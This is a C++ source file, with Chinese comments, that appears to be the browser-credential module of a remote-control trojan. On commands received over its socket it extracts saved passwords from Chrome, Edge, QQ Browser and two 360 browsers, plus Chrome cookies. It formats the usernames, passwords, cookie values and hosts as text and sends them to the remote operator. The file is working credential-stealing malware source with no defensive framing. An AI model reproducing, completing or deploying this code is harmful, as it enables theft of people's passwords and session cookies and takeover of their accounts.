// ShellManager.cpp: implementation of the CDecryptManger class.
//
//////////////////////////////////////////////////////////////////////
#include "stdafx.h"
#include "DecryptManger.h"



using namespace std;
//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

CDecryptManger::CDecryptManger(ISocketBase* pClient) :CManager(pClient)
{
	BYTE TOKEN = TOKEN_DECRYPT;
	Send((LPBYTE)&TOKEN, 1);
}

CDecryptManger::~CDecryptManger()
{

}

void CDecryptManger::OnReceive(LPBYTE lpBuffer, UINT nSize)
{
	switch (lpBuffer[0])
	{
	case COMMAND_LLQ_GetChromePassWord:
	{
		int size = 0;
		char* get = nullptr;
		if (GetChromePassWord(&get, &size))
		{
			Send((LPBYTE)get, size);
			DeleteMem(&get); // 释放内存
		}
		else
		{
			senderror();
		}
	}
	break;
	case	COMMAND_LLQ_GetEdgePassWord:
	{

		int size = 0;
		char* get = nullptr;
		if (GetEdgePassWord(&get, &size))
		{
			Send((LPBYTE)get, size);
			DeleteMem(&get); // 释放内存
		}
		else
		{
			senderror();
		}
	}
	break;
	case	COMMAND_LLQ_GetSpeed360PassWord:
	{

		int size = 0;
		char* get = nullptr;
		if (GetSpeed360PassWord(&get, &size))
		{
			Send((LPBYTE)get, size);
			DeleteMem(&get); // 释放内存
		}
		else
		{
			senderror();
		}
	}
	break;
	case	COMMAND_LLQ_Get360sePassWord:
	{
		int size = 0;
		char* get = nullptr;
		if (Get360sePassWord(&get, &size))
		{
			Send((LPBYTE)get, size);
			DeleteMem(&get); // 释放内存
		}
		else
		{
			senderror();
		}
	}
	break;
	case	COMMAND_LLQ_GetQQBroPassWord:
	{
		int size = 0;
		char* get = nullptr;
		if (GetQQBroPassWord(&get, &size))
		{
			Send((LPBYTE)get, size);
			DeleteMem(&get); // 释放内存
		}
		else
		{
			senderror();
		}
	}
	break;
	case	COMMAND_LLQ_GetChromeCookies:
	{
		int size = 0;
		char* get = nullptr;
		if (GetChromeCookies(&get, &size))
		{
			Send((LPBYTE)get, size);
			DeleteMem(&get); // 释放内存
		}
		else
		{
			senderror();
		}
	}
	break;
	default:
		senderror();
		break;
	}
}

void CDecryptManger::senderror()
{
	char* m_error = "获取失败";
	Send((LPBYTE)m_error, int(strlen(m_error)));
}

char* CDecryptManger::GetCookiesChar(vector<BrowserData>* pPass, int* memLen)
{
	if (pPass->size() == 0)
		return nullptr;
	int size = 1;
	for (vector<BrowserData>::iterator iter = (*pPass).begin(); iter != (*pPass).end(); iter++)
	{
		size += int((*iter).bro_name.size()) + 17;
		size += int((*iter).bro_url.size() )+ 17;
		size += int((*iter).user_name.size()) + 17;
		size += int((*iter).pass_word.size()) + 17;
		size += int((*iter).create_time.size()) + 17;
	}
	char* pCharPass = (char*)malloc(sizeof(char) * size);
	memset(pCharPass, 0, size);
	*memLen = size;
	for (vector<BrowserData>::iterator iter = (*pPass).begin(); iter != (*pPass).end(); iter++)
	{
		strcat_s(pCharPass, size, "浏览器: ");
		strcat_s(pCharPass, size, (*iter).bro_name.c_str());
		strcat_s(pCharPass, size, "\r\n");

		strcat_s(pCharPass, size, "Browser URL  : ");
		strcat_s(pCharPass, size, (*iter).bro_url.c_str());
		strcat_s(pCharPass, size, "\r\n");

		strcat_s(pCharPass, size, "User Name    : ");
		strcat_s(pCharPass, size, (*iter).user_name.c_str());
		strcat_s(pCharPass, size, "\r\n");

		strcat_s(pCharPass, size, "Pass word    : ");
		strcat_s(pCharPass, size, (*iter).pass_word.c_str());
		strcat_s(pCharPass, size, "\r\n");

		strcat_s(pCharPass, size, "Create time  : ");
		strcat_s(pCharPass, size, (*iter).create_time.c_str());
		strcat_s(pCharPass, size, "\r\n");

	}
	return pCharPass;
}

char* CDecryptManger::GetPassWChar(vector<BrowserCookies>* pCookies, int* memLen)
{
	if (pCookies->size() == 0)
		return nullptr;
	int size = 1;
	for (vector<BrowserCookies>::iterator iter = (*pCookies).begin(); iter != (*pCookies).end(); iter++)
	{
		size += int((*iter).bro_name.size()) + 17;
		size += int((*iter).name.size() )+ 17;
		size += int((*iter).host_key.size()) + 17;
		size += int((*iter).path.size()) + 17;
		size += int((*iter).value.size()) + 17;
		size += int((*iter).expire_UTC.size()) + 17;
		size += int((*iter).has_expires.size()) + 17;
		size += int((*iter).is_persistent.size()) + 17;
	}		    
	char* pCharCookies = (char*)malloc(sizeof(char) * size);
	memset(pCharCookies, 0, size);
	*memLen = size;
	for (vector<BrowserCookies>::iterator iter = (*pCookies).begin(); iter != (*pCookies).end(); iter++)
	{
		strcat_s(pCharCookies, size, "浏览器 : ");
		strcat_s(pCharCookies, size, (*iter).bro_name.c_str());
		strcat_s(pCharCookies, size, "\r\n");

		strcat_s(pCharCookies, size, "Cookies Name : ");
		strcat_s(pCharCookies, size, (*iter).name.c_str());
		strcat_s(pCharCookies, size, "\r\n");

		strcat_s(pCharCookies, size, "Host Key     : ");
		strcat_s(pCharCookies, size, (*iter).host_key.c_str());
		strcat_s(pCharCookies, size, "\r\n");

		strcat_s(pCharCookies, size, "path         : ");
		strcat_s(pCharCookies, size, (*iter).path.c_str());
		strcat_s(pCharCookies, size, "\r\n");

		strcat_s(pCharCookies, size, "value        : ");
		strcat_s(pCharCookies, size, (*iter).value.c_str());
		strcat_s(pCharCookies, size, "\r\n");

		strcat_s(pCharCookies, size, "expire UTC   : ");
		strcat_s(pCharCookies, size, (*iter).expire_UTC.c_str());
		strcat_s(pCharCookies, size, "\r\n");

		strcat_s(pCharCookies, size, "Has Expires  : ");
		strcat_s(pCharCookies, size, (*iter).has_expires.c_str());
		strcat_s(pCharCookies, size, "\r\n");

		strcat_s(pCharCookies, size, "IsPersistent : ");
		strcat_s(pCharCookies, size, (*iter).is_persistent.c_str());
		strcat_s(pCharCookies, size, "\r\n");
	}
	return pCharCookies;
}

// 获取chrome cookies
void CDecryptManger::DeleteMem(char** pChromeC)
{
	if (*pChromeC != nullptr)
	{
		delete* pChromeC;
	}
}


// 获取chrome cookies
bool CDecryptManger::GetChromeCookies(char** pChromeC, int* memLen)
{
	vector<BrowserCookies> Cookies;
	unique_ptr<GetBrowserInfo> ptrChrome(new GetBrowserInfo(chrome));
	bool ret = (ptrChrome->GetAllCookies(&Cookies))?true:false;

	if (ret)
	{
		*pChromeC = GetPassWChar(&Cookies, memLen);
		if (*pChromeC == nullptr)
		{
			ret = false;
		}
	}

	return ret;
}


// 获取chrome浏览器密码
bool CDecryptManger::GetChromePassWord(char** pChromePW, int* memLen)
{
	vector<BrowserData> BroData;
	unique_ptr<GetBrowserInfo> ptrChrome(new GetBrowserInfo(chrome));
	bool ret =( ptrChrome->GetAllData(&BroData))?true:false;

	if (ret)
	{
		*pChromePW = GetCookiesChar(&BroData, memLen);
		if (*pChromePW == nullptr)
		{
			ret = false;
		}
	}
	return ret;
}


// 获取windows10 edge浏览器密码
bool CDecryptManger::GetEdgePassWord(char** pChromePW, int* memLen)
{
	vector<BrowserData> BroData;
	unique_ptr<GetBrowserInfo> ptrEdge(new GetBrowserInfo(edge));
	bool ret = (ptrEdge->GetAllData(&BroData))?true:false;

	if (ret)
	{
		*pChromePW = GetCookiesChar(&BroData, memLen);
		if (*pChromePW == nullptr)
		{
			ret = false;
		}
	}
	return ret;
}

// 获取QQ浏览器密码
bool CDecryptManger::GetQQBroPassWord(char** pQQPW, int* memLen)
{
	vector<BrowserData> BroData;
	unique_ptr<GetBrowserInfo> ptrQQ(new GetBrowserInfo(QQ));
	bool ret = (ptrQQ->GetAllData(&BroData)) ? true : false;;

	if (ret)
	{
		*pQQPW = GetCookiesChar(&BroData, memLen);
		if (*pQQPW == nullptr)
		{
			ret = false;
		}
	}
	return ret;
}

// 获取speed360极速浏览器密码
bool CDecryptManger::GetSpeed360PassWord(char** pChromePW, int* memLen)
{
	vector<BrowserData> BroData;
	unique_ptr<GetBrowserInfo> ptrSpeed360(new GetBrowserInfo(speed360));
	bool ret =( ptrSpeed360->GetAllData(&BroData)) ? true : false;

	if (ret)
	{
		*pChromePW = GetCookiesChar(&BroData, memLen);
		if (*pChromePW == nullptr)
		{
			ret = false;
		}
	}
	return ret;
}


// 获取360安全浏览器密码
bool  CDecryptManger::Get360sePassWord(char** pChromePW, int* memLen)
{
	vector<BrowserData> BroData;
	unique_ptr<Get360seInfo> ptr360(new Get360seInfo());
	bool ret = (ptr360->getData(&BroData)) ? true : false;

	if (ret)
	{
		*pChromePW = GetCookiesChar(&BroData, memLen);

		if (*pChromePW == nullptr)
		{
			ret = false;
		}
	}
	return ret;
}

